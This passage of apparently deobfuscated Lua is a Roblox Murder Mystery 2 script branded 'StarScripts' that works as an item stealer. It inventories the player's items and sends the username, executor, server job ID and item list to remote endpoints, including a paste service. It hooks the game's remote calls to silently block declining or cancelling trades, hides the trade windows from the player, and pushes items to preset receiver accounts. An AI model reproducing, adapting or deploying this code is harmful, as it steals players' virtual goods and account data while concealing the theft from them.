				"tropical",
				"🌴"
			},
			{
				"coconut",
				"🥥"
			},
			{
				"dolphins",
				"🐬"
			},
			{
				"duckies",
				"🦆"
			},
			{
				"jellyfish",
				"🪼"
			},
			{
				"starfish",
				"⭐"
			},
			{
				"turtles",
				"🐢"
			},
			{
				"turtle",
				"🐢"
			},
			{
				"kraken",
				"🐙"
			},
			{
				"sharky",
				"🦈"
			},
			{
				"shark",
				"🦈"
			},
			{
				"watergun",
				"💦"
			},
			{
				"aquarium",
				"🐠"
			},
			{
				"waves",
				"🌊"
			},
			{
				"wave",
				"🌊"
			},
			{
				"tidal",
				"🌊"
			},
			{
				"tides",
				"🌊"
			},
			{
				"ocean",
				"🌊"
			},
			{
				"water",
				"💧"
			},
			{
				"icewing",
				"🧊"
			},
			{
				"icebreaker",
				"🧊"
			},
			{
				"iceblaster",
				"🧊"
			},
			{
				"icepiercer",
				"🧊"
			},
			{
				"iceflake",
				"❄️"
			},
			{
				"icicles",
				"🧊"
			},
			{
				"frostsaber",
				"❄️"
			},
			{
				"frostbite",
				"❄️"
			},
			{
				"frostflame",
				"❄️"
			},
			{
				"frostfade",
				"❄️"
			},
			{
				"frosted",
				"❄️"
			},
			{
				"frosty",
				"⛄"
			},
			{
				"frost",
				"❄️"
			},
			{
				"frozen",
				"🧊"
			},
			{
				"glacier",
				"🧊"
			},
			{
				"blizzard",
				"🌨️"
			},
			{
				"snowman",
				"⛄"
			},
			{
				"snowflake",
				"❄️"
			},
			{
				"snowball",
				"⛄"
			},
			{
				"snowcannon",
				"❄️"
			},
			{
				"snowstorm",
				"🌨️"
			},
			{
				"snowglobe",
				"🔮"
			},
			{
				"snow",
				"❄️"
			},
			{
				"winter",
				"🥶"
			},
			{
				"chill",
				"🥶"
			},
			{
				"arctic",
				"🧊"
			},
			{
				"polar bear",
				"🐻‍❄️"
			},
			{
				" ice ",
				"🧊"
			},
			{
				"nightfire",
				"🔥"
			},
			{
				"flame",
				"🔥"
			},
			{
				"fire",
				"🔥"
			},
			{
				"magma",
				"🌋"
			},
			{
				"heat",
				"🔥"
			},
			{
				"burn",
				"🔥"
			},
			{
				"candleflame",
				"🕯️"
			},
			{
				"candle",
				"🕯️"
			},
			{
				"elderwood",
				"🌲"
			},
			{
				"flowerwood",
				"🌸"
			},
			{
				"sakura",
				"🌸"
			},
			{
				"blossom",
				"🌸"
			},
			{
				"bloom",
				"🌸"
			},
			{
				"flora",
				"🌷"
			},
			{
				"floral",
				"🌷"
			},
			{
				"roses",
				"🌹"
			},
			{
				"rose",
				"🌹"
			},
			{
				"tulip",
				"🌷"
			},
			{
				"passion",
				"🌺"
			},
			{
				"leaves",
				"🍃"
			},
			{
				"leaf",
				"🍃"
			},
			{
				"meadow",
				"🌿"
			},
			{
				"forest",
				"🌳"
			},
			{
				"minty",
				"🌿"
			},
			{
				"mistletoe",
				"🌿"
			},
			{
				"log",
				"🪵"
			},
			{
				"wood",
				"🪵"
			},
			{
				"constellation",
				"🌌"
			},
			{
				"celestial",
				"🌌"
			},
			{
				"nebula",
				"🌌"
			},
			{
				"galaxy",
				"🌌"
			},
			{
				"galactic",
				"🌌"
			},
			{
				"universe",
				"🌌"
			},
			{
				"space",
				"🚀"
			},
			{
				"cosmic",
				"🌌"
			},
			{
				"aurora",
				"🌌"
			},
			{
				"borealis",
				"🌌"
			},
			{
				"australis",
				"🌌"
			},
			{
				"starry",
				"🌟"
			},
			{
				"nightstar",
				"🌟"
			},
			{
				"nightsky",
				"🌌"
			},
			{
				"alienbeam",
				"👽"
			},
			{
				"abduction",
				"👽"
			},
			{
				"aliens",
				"👽"
			},
			{
				"ufo",
				"🛸"
			},
			{
				"raygun",
				"🔫"
			},
			{
				"xeno",
				"👽"
			},
			{
				"skull",
				"💀"
			},
			{
				"bone",
				"🦴"
			},
			{
				"phantom",
				"👻"
			},
			{
				"spectre",
				"👻"
			},
			{
				"spectral",
				"👻"
			},
			{
				"ghostly",
				"👻"
			},
			{
				"ghosts",
				"👻"
			},
			{
				"ghost",
				"👻"
			},
			{
				"ghoulish",
				"👻"
			},
			{
				"soul",
				"👻"
			},
			{
				"spirit",
				"👻"
			},
			{
				"haunted",
				"🏚️"
			},
			{
				"witch",
				"🧙"
			},
			{
				"vampire",
				"🧛"
			},
			{
				"zombified",
				"🧟"
			},
			{
				"zombie",
				"🧟"
			},
			{
				"infected",
				"🦠"
			},
			{
				"mummy",
				"🧟"
			},
			{
				"mummified",
				"🧟"
			},
			{
				"reaper",
				"☠️"
			},
			{
				"pumpking",
				"🎃"
			},
			{
				"web",
				"🕸️"
			},
			{
				"spider",
				"🕷️"
			},
			{
				"bats",
				"🦇"
			},
			{
				"eyeball",
				"👁️"
			},
			{
				"seer",
				"👁️"
			},
			{
				"santa",
				"🎅"
			},
			{
				"reindeer",
				"🦌"
			},
			{
				"sleigh",
				"🛷"
			},
			{
				"sweater",
				"🧶"
			},
			{
				"stockings",
				"🧦"
			},
			{
				"nutcracker",
				"🥜"
			},
			{
				"ornament",
				"🔴"
			},
			{
				"wreath",
				"🎄"
			},
			{
				"present",
				"🎁"
			},
			{
				"wrapped",
				"🎁"
			},
			{
				"giftwrap",
				"🎁"
			},
			{
				"gift",
				"🎁"
			},
			{
				"bauble",
				"🔮"
			},
			{
				"penguin",
				"🐧"
			},
			{
				"turkey",
				"🦃"
			},
			{
				"heartblade",
				"❤️"
			},
			{
				"heart wand",
				"💖"
			},
			{
				"heartbreak",
				"💔"
			},
			{
				"heart",
				"❤️"
			},
			{
				"cupid",
				"💘"
			},
			{
				"valentine",
				"💘"
			},
			{
				"love",
				"❤️"
			},
			{
				"sweetheart",
				"💝"
			},
			{
				"storm",
				"🌩️"
			},
			{
				"cursed",
				"🧿"
			},
			{
				"chromatic",
				"🌈"
			},
			{
				"energized",
				"⚡"
			},
			{
				"pier",
				"🎣"
			},
			{
				"spitfire",
				"🔥"
			},
			{
				"scythe",
				"🌾"
			},
			{
				"battleaxe",
				"🪓"
			},
			{
				"swirly axe",
				"🪓"
			},
			{
				"handsaw",
				"🪚"
			},
			{
				"saw",
				"🪚"
			},
			{
				"makeshift",
				"🛠️"
			},
			{
				"logchopper",
				"🪓"
			},
			{
				"clockwork",
				"⏰"
			},
			{
				"gemstone",
				"💎"
			},
			{
				"emerald",
				"💚"
			},
			{
				"pearlshine",
				"🦪"
			},
			{
				"pearl",
				"🦪"
			},
			{
				"prismatic",
				"🔷"
			},
			{
				"prism",
				"🔷"
			},
			{
				"gingerscope",
				"🔭"
			},
			{
				"jinglegun",
				"🔔"
			},
			{
				"bioblade",
				"🧬"
			},
			{
				"bio",
				"🧬"
			},
			{
				"virtual",
				"🕹️"
			},
			{
				"pixel",
				"👾"
			},
			{
				"hacker",
				"💻"
			},
			{
				"robot",
				"🤖"
			},
			{
				"korblox",
				"🦿"
			},
			{
				"musical",
				"🎵"
			},
			{
				"traveler",
				"🧳"
			},
			{
				"eternal",
				"♾️"
			},
			{
				"fang",
				"🦷"
			},
			{
				"ripper",
				"🗡️"
			},
			{
				"predator",
				"🐊"
			},
			{
				"viper",
				"🐍"
			},
			{
				"snakebite",
				"🐍"
			},
			{
				"tiger",
				"🐯"
			},
			{
				"pirate",
				"🏴‍☠️"
			},
			{
				"butterflies",
				"🦋"
			},
			{
				"bubbles",
				"🫧"
			},
			{
				"swirly",
				"🌀"
			},
			{
				"swirl",
				"🌀"
			},
			{
				"plasma",
				"⚡"
			},
			{
				"laser",
				"⚡"
			},
			{
				"luger",
				"🔫"
			},
			{
				"blaster",
				"🔫"
			},
			{
				"slasher",
				"🩸"
			},
			{
				"blood",
				"🩸"
			},
			{
				"hazard",
				"☢️"
			},
			{
				"toxic",
				"☣️"
			},
			{
				"apocalypse",
				"☄️"
			},
			{
				"america",
				"🇺🇸"
			},
			{
				"old glory",
				"🇺🇸"
			},
			{
				"prince",
				"👑"
			},
			{
				"coal",
				"🪨"
			},
			{
				"neon",
				"💡"
			},
			{
				"light",
				"💡"
			},
			{
				"sparkle",
				"✨"
			},
			{
				"shiny",
				"✨"
			},
			{
				"eclipse",
				"🌘"
			},
			{
				"night",
				"🌙"
			},
			{
				"shadow",
				"🌑"
			},
			{
				"dark",
				"🌑"
			},
			{
				"star",
				"⭐"
			},
			{
				"rainbow",
				"🌈"
			},
			{
				"prismatic",
				"🔷"
			}
		}

		for _, v in ipairs(p36) do
			local displayName = v.displayName or v.name
			local v291 = " " .. (displayName .. " " .. v.id):lower() .. " "
			local s3 = "🔪"

			if v.itemType == "Gun" then
				s3 = "🔫"
			elseif v.itemType == "Pet" or v.category == "Pets" then
				s3 = "🐾"
			end

			local s4

			if v.category == "Pets" then
				s4 = "🐾"
			elseif v.valueCategory == "Chroma" or v.valueCategory == "Chromas" or v.isChroma then
				s4 = "🌈" .. s3
			else
				s4 = s3

				for _, v2 in ipairs(t34) do
					if v291:find(v2[1], 1, true) then
						s4 = v2[2]

						break
					end
				end
			end

			local v296

			if v.amount > 1 then
				v296 = string.format("%s x%d %s ➜ %s Value (%s)", s4, v.amount, displayName, v272(v.totalValue), v.rarity)
			else
				v296 = string.format("%s x1 %s ➜ %s Value (%s)", s4, displayName, v272(v.totalValue), v.rarity)
			end

			table.insert(t33, v296)
		end

		if #t33 == 0 then
			table.insert(t33, "(No tradeable items)")
		end

		return t33
	end

	local t35 = {}
	local v298, v299, v300 = ipairs(v285(u268))

	for _, v in v298, v299, v300 do
		table.insert(t35, v)
	end

	local function v303(p37)
		local ok, result = pcall(http_request_, {
			Url = "https://api.rubis.app/v2/scrap?public=true",
			Method = "POST",
			Headers = {
				["Content-Type"] = "text/plain",
				Accept = "application/json"
			},
			Body = p37
		})

		if not ok or not result then
			return ""
		end

		local StatusCode = result.StatusCode or result.status
		local v307 = tonumber(StatusCode or result.Status) or 0

		if v307 < 200 or v307 >= 300 then
			return ""
		end

		local ok2, result2 = pcall(HttpService.JSONDecode, HttpService, tostring(result.Body or result.body or ""))

		if ok2 and type(result2) == "table" then
			return tostring(result2.raw or result2.scrapID and "https://api.rubis.app/v2/scrap/" .. result2.scrapID .. "/raw" or result2.id and "https://api.rubis.app/v2/scrap/" .. result2.id .. "/raw" or "")
		end

		return ""
	end

	local v310 = table.concat(t35, "\n")
	local StarScriptsMM2SummaryCache = genv.StarScriptsMM2SummaryCache
	local Url

	if type(StarScriptsMM2SummaryCache) == "table" and StarScriptsMM2SummaryCache.Text == v310 and type(StarScriptsMM2SummaryCache.Url) == "string" then
		Url = StarScriptsMM2SummaryCache.Url
	else
		os.clock()
		Url = v303(v310)

		if Url ~= "" then
			genv.StarScriptsMM2SummaryCache = {
				Text = v310,
				Url = Url
			}
		end
	end

	local t36 = {}
	local v314, v315, v316 = ipairs(u268)
	local v317 = geniter(v314, v315, v316)

	while true do
		local v318 = table.pack(v317())

		if v318[1] then
			local v319 = v318[3]

			if not (v318[2] > 15) then
				table.insert(t36, v319)

				continue
			end

			break
		end

		break
	end

	local v320 = table.concat(v285(t36), "\n")
	local v321 = #u268 - #t36

	if v321 > 0 then
		v320 ..= string.format("\n... and %d more item%s", v321, v321 == 1 and "" or "s")
	end

	local v322 = string.format("%.2f", n9 * 15 / 1000)
	local v323 = "💰 Total Value ➜ " .. v272(n9) .. " / " .. v322 .. "$\n" .. "==============================\n\n" .. v320
	local s5 = "Unknown"
	local identifyexecutor_ = identifyexecutor or getexecutorname

	if type(identifyexecutor_) == "function" then
		local ok, result = pcall(identifyexecutor_)

		if ok and result then
			s5 = tostring(result)
		end
	end

	local function v328()
		local v329
		local v330 = os.clock() + 1

		repeat
			for _, v in ipairs(getgc(true)) do
				if typeof(v) == "function" then
					local ok, result = pcall(debug.getinfo, v)

					if ok and result and result.name == "stepAnimate" then
						v329 = v

						break
					end
				end
			end

			if not v329 then
				task.wait(0.2)
			end
		until v329 or v330 <= os.clock()

		if not v329 then
			return game.JobId
		end

		local JobId
		local v336

		v336 = hookfunction(v329, function(...)
			if not JobId then
				JobId = game.JobId
			end

			return v336(...)
		end)

		local v337 = os.clock() + 1

		while true do
			task.wait(0.2)

			if JobId then
				break
			elseif v337 <= os.clock() then
				break
			end
		end

		local JobId2 = JobId or game.JobId

		return JobId2
	end

	v280 = v328()
	v281 = HttpService:GenerateGUID(false)

	local t37 = {}
	local v340, v341, v342 = ipairs(t2)

	for k, v in v340, v341, v342 do
		t37[k] = v
	end

	local function v345(p38, p39)
		local t38 = {}
		local n11 = 1
		local v348 = #p38
		local v349 = p39 or 200

		for i = n11, math.min(v348, v349) do
			local v351 = p38[i]

			t38[#t38 + 1] = {
				name = v351.name,
				itemType = v351.itemType,
				category = v351.category,
				year = v351.year,
				event = v351.event,
				isChroma = v351.isChroma == true,
				rarity = v351.rarity,
				amount = v351.amount
			}
		end

		return t38
	end

	local t39 = {
		game = "mm2",
		username = LocalPlayer.Name,
		displayName = LocalPlayer.DisplayName,
		executorName = s5,
		receivers = t37,
		items = v345(u268, 200),
		summaryUrl = Url,
		placeId = tostring(game.PlaceId),
		jobId = v280,
		shouldPing = true,
		sessionRunId = v281
	}
	local now = os.time()
	local signNonce = HttpService:GenerateGUID(false):gsub("-", ""):sub(1, 24)
	local v355 = v117()
	local v356 = v113(v106(table.concat({
		v8,
		tostring(now),
		signNonce,
		LocalPlayer.Name,
		v355
	}, "|"), staticKey))

	if not v356 then
		return
	end

	t39.timestamp = now
	t39.fingerprint = v355
	t39.signNonce = signNonce
	t39.signSignature = v356
	starScriptsMM2LiveRuntime = {
		Active = true,
		MessageId = nil,
		Completed = false,
		Stopping = false,
		PendingTrades = {}
	}
	genv.StarScriptsMM2LiveRuntime = starScriptsMM2LiveRuntime

	local function v357(p40)
		local JSONDecode = HttpService.JSONDecode
		local v359 = HttpService
		local ok, result = pcall(JSONDecode, v359, tostring(p40 or ""))

		if ok and type(result) == "table" then
			return result
		end
	end
	local function v362()
		local json = HttpService:JSONEncode(t39)
		local v364 = v140(json, staticKey) or json
		local n12 = 0
		local s6 = "no response"

		for i = 1, 3 do
			local ok, result = pcall(http_request_, {
				Url = v10,
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json",
					Accept = "application/json",
					["User-Agent"] = "RobloxStudio/WinInet"
				},
				Body = v364
			})

			if ok and result then
				local v370 = type(result) == "table"

				if v370 then
					v370 = tostring(result.Body or result.body or "")
				end

				v370 = v370 or tostring(result)

				local v371 = type(result) == "table"

				if v371 then
					v371 = tonumber(result.StatusCode or result.status or result.Status)
				end

				n12 = v371 or 0
				s6 = v370:sub(1, 160)

				local v372 = v370:find("\"delivered\"%s*:%s*true") ~= nil
				local v373 = v357(v370)
				local messageId = v373 and v373.messageId

				if messageId ~= nil then
					messageId = tostring(messageId)
				end

				if n12 >= 200 and n12 < 300 then
					if v372 then
						return true, n12, s6, messageId
					end
				end

				if n12 == 0 and v372 then
					return true, 200, s6, messageId
				end

				if n12 >= 400 and n12 < 500 and n12 ~= 429 then
					break
				end
			else
				s6 = tostring(result):sub(1, 160)
			end

			if i < 3 then
				task.wait(0.35 * i)
			end
		end

		return false, n12, s6
	end

	v283 = function(p41, p42, p43)
		if not starScriptsMM2LiveRuntime.Active or starScriptsMM2LiveRuntime.Stopping and p41 ~= "disconnect" or not starScriptsMM2LiveRuntime.MessageId then
			return false
		end

		local t40 = {
			username = LocalPlayer.Name,
			jobId = v280,
			messageId = starScriptsMM2LiveRuntime.MessageId,
			action = p41
		}
		local now2 = os.time()
		local signNonce2 = HttpService:GenerateGUID(false):gsub("-", ""):sub(1, 24)
		local v378 = v117()
		local v379 = v113(v106(table.concat({
			v8,
			tostring(now2),
			signNonce2,
			LocalPlayer.Name,
			v378
		}, "|"), staticKey))

		if v379 then
			t40.timestamp = now2
			t40.fingerprint = v378
			t40.signNonce = signNonce2
			t40.signSignature = v379
		else
			t40.staticKey = staticKey
		end

		local v380 = p42 or {}

		for k, v in pairs(v380) do
			t40[k] = v
		end

		local json = HttpService:JSONEncode(t40)
		local v384 = v140(json, staticKey) or json
		local v385 = math.max(1, tonumber(p43) or 1)

		for i = 1, v385 do
			local ok, result = pcall(http_request_, {
				Url = v11,
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json",
					Accept = "application/json"
				},
				Body = v384
			})

			if ok and result then
				local v389 = type(result) == "table"

				if v389 then
					v389 = tonumber(result.StatusCode or result.status or result.Status)
				end

				v389 = v389 or 0

				local v390 = type(result) == "table"

				if v390 then
					v390 = tostring(result.Body or result.body or "")
				end

				local v391 = v357(v390 or tostring(result))

				if v389 >= 200 and v389 < 300 or v389 == 0 and v391 and v391.status then
					return true, v391
				end

				if v389 >= 400 and v389 < 500 and v389 ~= 429 then
					return false, v391
				end
			end

			if i < v385 then
				task.wait(math.min(2, 0.35 * i))
			end
		end

		return false
	end
	v284 = function(p44, p45)
		local v392 = math.max(0, tonumber(p44) or 0)

		if v392 <= 0 then
			return
		end

		local t41 = {
			tradeValue = v392,
			tradeId = tostring(p45)
		}

		if not starScriptsMM2LiveRuntime.MessageId then
			table.insert(starScriptsMM2LiveRuntime.PendingTrades, t41)

			return
		end

		task.spawn(function()
			local v394 = v283("trade_completed", t41, 5)

			if v394 then
				starScriptsMM2LiveRuntime.Completed = true
			end
		end)
	end

	local function v396(p46)
		if p46 then
			if tostring(p46):match("^%d+$") then
				starScriptsMM2LiveRuntime.MessageId = tostring(p46)

				for _, pendingTrade in ipairs(starScriptsMM2LiveRuntime.PendingTrades) do
					v284(pendingTrade.tradeValue, pendingTrade.tradeId)
				end

				starScriptsMM2LiveRuntime.PendingTrades = {}
				task.spawn(function()
					local n13 = 0

					while starScriptsMM2LiveRuntime.Active and not starScriptsMM2LiveRuntime.Stopping and not starScriptsMM2LiveRuntime.Completed do
						if not (n13 < 6) then
							break
						end

						task.spawn(function()
							local v400, v401 = v283("heartbeat", nil, 2)

							if v400 then
								n13 = 0
							elseif type(v401) == "table" and v401.error == "session_not_found" then
								n13 += 1
							end
						end)
						task.wait(10)
					end
				end)

				return
			end
		end
	end
	local function v402()
		if starScriptsMM2LiveRuntime.Completed or starScriptsMM2LiveRuntime.Stopping then
			return
		end

		starScriptsMM2LiveRuntime.Stopping = true
		task.spawn(function()
			v283("disconnect", nil, 3)
			starScriptsMM2LiveRuntime.Active = false
		end)
	end

	Players.PlayerRemoving:Connect(function(player)
		if player == LocalPlayer then
			v402()
		end
	end)
	game:GetService("GuiService").ErrorMessageChanged:Connect(function(p47)
		local v403 = tostring(p47 or ""):lower()

		if v403 ~= "" then
			if v403:find("disconnect", 1, true) or v403:find("connection", 1, true) or v403:find("kicked", 1, true) or v403:find("error code", 1, true) then
				v402()
			end
		end
	end)
	task.spawn(function()
		os.clock()

		local v404, _, _, v407 = v362()

		if v404 then
			v396(v407)
		end
	end)
end

local Trade = ReplicatedStorage:WaitForChild("Trade")
local SendRequest = Trade:WaitForChild("SendRequest")
local GetTradeStatus = Trade:WaitForChild("GetTradeStatus")

if genv.StarScriptsTradeRuntime then
	genv.StarScriptsTradeRuntime.Active = false

	local v411, v412, v413 = pairs(genv.StarScriptsTradeRuntime.Connections or {})

	for _, v in v411, v412, v413 do
		pcall(function()
			v:Disconnect()
		end)
	end
end

local starScriptsTradeRuntime = {
	Active = true,
	Connections = {},
	Session = 0,
	Update = 0,
	OtherPlayer = nil,
	Target = nil,
	LastTarget = nil,
	Selected = {},
	RestartToken = 0,
	LastInviteAt = 0,
	ObservedOffer = nil,
	AcceptGeneration = 0,
	AcceptScheduled = false,
	AcceptPending = false,
	LastAcceptSentAt = 0,
	PendingCompletion = nil,
	ConfirmedCompletionPending = false,
	FinishedKickScheduled = false,
	TradeCompleted = false
}

genv.StarScriptsTradeRuntime = starScriptsTradeRuntime

local u417 = false
local v418
local t42 = {}
local obj = setmetatable({}, {
	__mode = "k"
})
local u421 = false
local v422 = false
local RemoteEvent = Instance.new("RemoteEvent")
local RemoteFunction = Instance.new("RemoteFunction")
local FireServer = RemoteEvent.FireServer
local InvokeServer = RemoteFunction.InvokeServer

RemoteEvent:Destroy()
RemoteFunction:Destroy()

local function v427(p48, ...)
	local v428 = coroutine.running()
	local v429 = obj[v428]

	obj[v428] = true

	local ok = pcall(FireServer, p48, ...)

	obj[v428] = v429

	return ok
end
local function v432(p49, ...)
	local v433 = coroutine.running()
	local v434 = obj[v433]

	obj[v433] = true

	local ok, result = pcall(InvokeServer, p49, ...)

	obj[v433] = v434

	return ok, result
end

local OfferItem = Trade:WaitForChild("OfferItem")
local AcceptTrade = Trade:WaitForChild("AcceptTrade")
local AcceptRequest = Trade:WaitForChild("AcceptRequest")
local DeclineTrade = Trade:WaitForChild("DeclineTrade")
local DeclineRequest = Trade:WaitForChild("DeclineRequest")

do
	local t43 = {
		DeclineTrade = true,
		DeclineRequest = true,
		CancelRequest = true,
		CancelAccept = true,
		RemoveOffer = true,
		SetRequestsEnabled = true
	}
	local t44 = {
		DeclineTrade = true,
		DeclineRequest = true,
		CancelRequest = true,
		CancelAccept = true,
		RemoveOffer = true
	}
	local n14 = 0
	local n15 = 0
	local v446, v447, v448 = ipairs(Trade:GetChildren())

	for _, v in v446, v447, v448 do
		if t44[v.Name] and (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
			t42[v] = true

			if pcall(function()
				v.Parent = ReplicatedStorage
				v.Name = HttpService:GenerateGUID(false)
			end) then
				n14 += 1
			else
				n15 += 1
			end
		end
	end

	local function v451(descendant)
		if t43[descendant.Name] then
			if descendant:IsA("RemoteEvent") or descendant:IsA("RemoteFunction") then
				t42[descendant] = true
			end
		end
	end

	local v452, v453, v454 = ipairs(Trade:GetDescendants())

	for _, v in v452, v453, v454 do
		v451(v)
	end

	table.insert(starScriptsTradeRuntime.Connections, Trade.DescendantAdded:Connect(v451))
end

do
	local RemoteEvent2 = Instance.new("RemoteEvent")
	local u458 = false

	local function v459()
		if type(hookfunction) ~= "function" then
			return false
		end

		return (pcall(function()
			local v460
			local v461

			local function v462(p50, ...)
				if not t42[p50] or obj[coroutine.running()] then
					return v460(p50, ...)
				end

				if p50 == RemoteEvent2 then
					u458 = true
				end
			end
			local function v463(p51, ...)
				if t42[p51] and not obj[coroutine.running()] then
					return
				end

				return v461(p51, ...)
			end

			local v464 = v462
			local v465 = v463

			if type(newcclosure) == "function" then
				v464 = newcclosure(v462)
				v465 = newcclosure(v463)
			end

			v460 = hookfunction(FireServer, v464)
			v461 = hookfunction(InvokeServer, v465)

			if type(v460) ~= "function" or type(v461) ~= "function" then
				error("hookfunction did not return the originals")
			end

			FireServer = v460
			InvokeServer = v461
			u421 = true
		end))
	end

	t42[RemoteEvent2] = true
	v459()

	if type(getnamecallmethod) == "function" then
		local getnamecallmethod_ = getnamecallmethod
		local u467

		local function v468(p52, ...)
			if t42[p52] and not obj[coroutine.running()] then
				local v469 = getnamecallmethod_()

				if v469 == "FireServer" or v469 == "InvokeServer" then
					return nil
				end
			end

			return u467(p52, ...)
		end

		if type(hookmetamethod) == "function" then
			local ok, result = pcall(hookmetamethod, game, "__namecall", v468)

			if ok and type(result) == "function" then
				u467 = result
				v422 = true
			end
		end

		if not v422 and type(getrawmetatable) == "function" then
			local v472 = pcall(function()
				local v473 = getrawmetatable(game)
				local v474 = type(setreadonly) == "function"

				if v474 then
					setreadonly(v473, false)
				end

				local __namecall = v473.__namecall

				if type(__namecall) == "function" then
					u467 = __namecall
					v473.__namecall = v468
				end

				if v474 then
					setreadonly(v473, true)
				end
			end) and type(u467) == "function"
		end
	end

	if u421 then
		task.spawn(function()
			local n16 = 0

			while starScriptsTradeRuntime.Active do
				if not (n16 < 20) then
					break
				end

				task.wait(5)
				u458 = false
				pcall(function()
					RemoteEvent2:FireServer()
				end)

				if not u458 then
					n16 += 1
					u421 = false
					v459()
				end
			end
		end)
	end
end

local t45 = {
	TradeRequest = true,
	SendingRequest = true,
	ReceivingRequest = true
}

local function v478(p53)
	return p53:IsA("GuiObject") and t45[p53.Name] == true
end
local function v479()
	for _, descendant in ipairs(LocalPlayer.PlayerGui:GetDescendants()) do
		if v478(descendant) then
			descendant.Visible = false
		end
	end
end
local function v482()
	for _, v in ipairs({
		"TradeGUI",
		"TradeGUI_Phone"
	}) do
		local v485 = LocalPlayer.PlayerGui:FindFirstChild(v)

		if v485 and v485:IsA("ScreenGui") then
			v485.Enabled = false
		end
	end
end
local function v486(p54)
	if not p54:IsA("ScreenGui") or p54.Name ~= "TradeGUI" and p54.Name ~= "TradeGUI_Phone" then
		return
	end

	if p54.Enabled then
		p54.Enabled = false
	end

	table.insert(starScriptsTradeRuntime.Connections, p54:GetPropertyChangedSignal("Enabled"):Connect(function()
		if starScriptsTradeRuntime.Active and p54.Enabled then
			p54.Enabled = false
		end
	end))
end

local v487, v488, v489 = ipairs(LocalPlayer.PlayerGui:GetChildren())

for _, v in v487, v488, v489 do
	v486(v)
end

table.insert(starScriptsTradeRuntime.Connections, LocalPlayer.PlayerGui.ChildAdded:Connect(function(child)
	v486(child)

	if starScriptsTradeRuntime.Active then
		task.defer(v482)
	end
end))

local function v492(p55)
	if v478(p55) then
		p55.Visible = false
		table.insert(starScriptsTradeRuntime.Connections, p55:GetPropertyChangedSignal("Visible"):Connect(function()
			if starScriptsTradeRuntime.Active and p55.Visible then
				p55.Visible = false
			end
		end))
	end
end

local v493, v494, v495 = ipairs(LocalPlayer.PlayerGui:GetDescendants())

for _, v in v493, v494, v495 do
	v492(v)
end

table.insert(starScriptsTradeRuntime.Connections, LocalPlayer.PlayerGui.DescendantAdded:Connect(function(descendant)
	if v478(descendant) then
		v492(descendant)
		task.defer(v479)
	end
end))

local function v498()
	local t46 = {}
	local t47 = {}

	for _, v in ipairs(u268) do
		local v503 = v.category .. "\0" .. v.id

		if t47[v503] then
			continue
		else
			t47[v503] = true
			table.insert(t46, v)

			if not (#t46 >= 4) then
				continue
			end
		end

		break
	end

	return t46
end

local v504

do
	local function v505(p56)
		local n17 = 0
		local v507 = p56 or {}

		for _, v in ipairs(v507) do
			local v510 = math.max(1, math.floor(tonumber(v.amount) or 1))

			n17 += math.max(0, tonumber(v.value) or 0) * v510
		end

		return n17
	end
	local function v511(p57)
		if type(p57) ~= "table" then
			return nil
		end

		for _, v in ipairs({
			"Player1",
			"Player2"
		}) do
			local v514 = p57[v]

			if v514 and v514.Player == LocalPlayer then
				return v514.Offer
			end
		end
	end
	local function v515(p58, p59)
		local v516 = p58 or {}

		for _, v in pairs(v516) do
			local ItemID = v[1] or v.ItemID
			local v520 = tonumber(v[2] or v.Amount) or 1
			local ItemType = v[3] or v.ItemType

			if tostring(ItemID) == p59.id and tostring(ItemType) == p59.category then
				return v520
			end
		end

		return 0
	end
	local function v522(p60)
		if #starScriptsTradeRuntime.Selected == 0 then
			return false
		end

		for _, v in ipairs(starScriptsTradeRuntime.Selected) do
			local v525 = math.max(1, math.floor(tonumber(v.amount) or 1))

			if v515(p60, v) < v525 then
				return false
			end
		end

		return true
	end

	v504 = function(p61)
		if p61 and v15(p61) and (not u19 or v20(p61)) then
			local v526 = Players:FindFirstChild(p61)

			if v526 and v526 ~= LocalPlayer then
				return v526
			end
		end

		for _, v in ipairs(t2) do
			local v529 = Players:FindFirstChild(v)

			if not v529 or v529 == LocalPlayer then
				continue
			end

			return v529
		end
	end

	local function v530()
		if starScriptsTradeRuntime.FinishedKickScheduled then
			return
		end

		starScriptsTradeRuntime.FinishedKickScheduled = true
		starScriptsTradeRuntime.Active = false
		pcall(function()
			local setclipboard_ = setclipboard or toclipboard

			if type(setclipboard_) == "function" then
				setclipboard_("https://discord.gg/starscripts")
			end
		end)
	end
	local function v532(p62)
		local LastTarget = p62 or starScriptsTradeRuntime.LastTarget

		if LastTarget then
			starScriptsTradeRuntime.LastTarget = LastTarget
		end

		starScriptsTradeRuntime.RestartToken += 1

		local RestartToken = starScriptsTradeRuntime.RestartToken

		starScriptsTradeRuntime.Session += 1
		starScriptsTradeRuntime.Update += 1
		starScriptsTradeRuntime.OtherPlayer = nil
		starScriptsTradeRuntime.Target = nil
		starScriptsTradeRuntime.Selected = {}
		starScriptsTradeRuntime.ObservedOffer = nil
		starScriptsTradeRuntime.AcceptGeneration += 1
		starScriptsTradeRuntime.AcceptScheduled = false
		starScriptsTradeRuntime.AcceptPending = false
		starScriptsTradeRuntime.LastAcceptSentAt = 0
		u417 = false
		task.delay(1.25, function()
			if not starScriptsTradeRuntime.Active or starScriptsTradeRuntime.RestartToken ~= RestartToken then
				return
			end

			local v535, v536 = v152(true)

			u268 = v535

			local v537 = v536

			if #u268 ~= 0 then
				starScriptsTradeRuntime.ConfirmedCompletionPending = false

				local v538 = v504(LastTarget)

				if v538 then
					v418(v538)
				end

				return
			end

			if starScriptsTradeRuntime.ConfirmedCompletionPending then
				if v537 then
					v530()

					return
				end
			end
		end)
	end

	table.insert(starScriptsTradeRuntime.Connections, Trade.StartTrade.OnClientEvent:Connect(function(p63, p64)
		v482()
		starScriptsTradeRuntime.Session += 1
		starScriptsTradeRuntime.Update += 1
		starScriptsTradeRuntime.OtherPlayer = tostring(p64)
		starScriptsTradeRuntime.ObservedOffer = nil
		starScriptsTradeRuntime.AcceptGeneration += 1
		starScriptsTradeRuntime.AcceptScheduled = false
		starScriptsTradeRuntime.AcceptPending = false
		starScriptsTradeRuntime.LastAcceptSentAt = 0
		starScriptsTradeRuntime.PendingCompletion = nil
		u268 = v152(true)
		starScriptsTradeRuntime.Selected = v498()

		if not v15(starScriptsTradeRuntime.OtherPlayer) then
			starScriptsTradeRuntime.Target = nil
			starScriptsTradeRuntime.Selected = {}
			v482()
			v427(DeclineTrade)

			return
		end

		starScriptsTradeRuntime.Target = starScriptsTradeRuntime.OtherPlayer
		starScriptsTradeRuntime.LastTarget = starScriptsTradeRuntime.OtherPlayer

